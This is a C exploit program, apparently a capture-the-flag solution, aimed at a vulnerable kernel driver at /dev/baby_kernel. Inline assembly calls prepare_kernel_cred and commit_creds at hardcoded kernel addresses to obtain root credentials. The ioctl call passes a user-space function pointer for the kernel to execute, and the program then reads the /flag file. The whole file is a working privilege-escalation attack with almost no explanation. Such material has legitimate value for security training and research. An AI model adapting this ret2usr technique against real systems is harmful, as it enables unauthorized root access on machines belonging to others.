#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define PREPARE_KERNEL_CREDS    0xffffffff81094670
#define COMMIT_CREDS            0xffffffff810943d0

// Getting root creds and committing them so to escale privileges
void shellcode_2()
{
    unsigned long long *root_creds;

    asm volatile (
        "mov rax, %0\n"
        "mov rdi, 0\n"
        "call rax"
        : "=a"(root_creds)              // output vars (=a means RAX)
        : "r"(PREPARE_KERNEL_CREDS)     // input vars
        : "rdi"                         // clobbers (regs that the compiler should not use while executing this piece of asm code, they cannot contain any reg used for the output)
    );

    // printf("Root creds: %p\n", root_creds);

    asm volatile (
        "mov rax, %0\n"
        "mov rdi, %1\n"
        "call rax"
        :
        : "r"(COMMIT_CREDS), "R"(root_creds)
        : "rax", "rdi"
    );
}

int main()
{
    int fd;
    char buf[100];

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    fd = open("/dev/baby_kernel", O_RDWR);

    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    printf("File opened: fd = %d\n", fd);
    ioctl(fd, 1337, shellcode_2);
    close(fd);
    fd = open("/flag", O_RDONLY);

    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    read(fd, buf, sizeof(buf));
    printf("Flag: %s\n", buf);
    close(fd);

    return 0;
}